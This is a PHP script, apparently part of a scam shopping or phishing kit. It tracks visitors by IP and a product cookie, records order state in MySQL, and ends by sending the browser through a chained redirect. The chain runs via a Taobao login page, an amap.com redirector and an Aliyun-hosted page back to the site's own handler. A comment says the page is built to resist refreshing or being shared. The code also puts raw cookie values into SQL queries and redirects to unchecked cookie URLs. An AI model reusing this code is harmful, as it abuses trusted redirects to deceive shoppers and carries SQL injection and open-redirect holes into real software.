<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

$xzshijian=date('Y-m-d H:i:s', time());
$ip=getIP();

//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE
setcookie('GoodsID2',$_COOKIE['GoodsID']);
setcookie("GoodsID");

if($_COOKIE['GoodsID']){
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=11,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID']}' LIMIT 1") or die(mysql_error());
					
		  _close();
		  session_destroy();
		  
	}

}
//判断在商品页传过来的COOKIE是否存在(此页面是登陆页面，属于安全系数，所以用于防止客户刷新依然停留或者发给其他用户看)
//如果发给用户看，COOKIE中的URL地址不存在，就返回设定好的跳转地址
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID']){
	   header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}
  
exit('<script>top.location.href="https://login.m.taobao.com/login.htm?tpl_redirect_url=https://f.amap.com/new/redirect?target=https%3A%2F%2Fhellohello.oss-cn-beijing.aliyuncs.com%2Furl.htm%3Furlu%3Dhttp://'.$_SERVER['HTTP_HOST'].'/xy/dd.php"</script>');
?>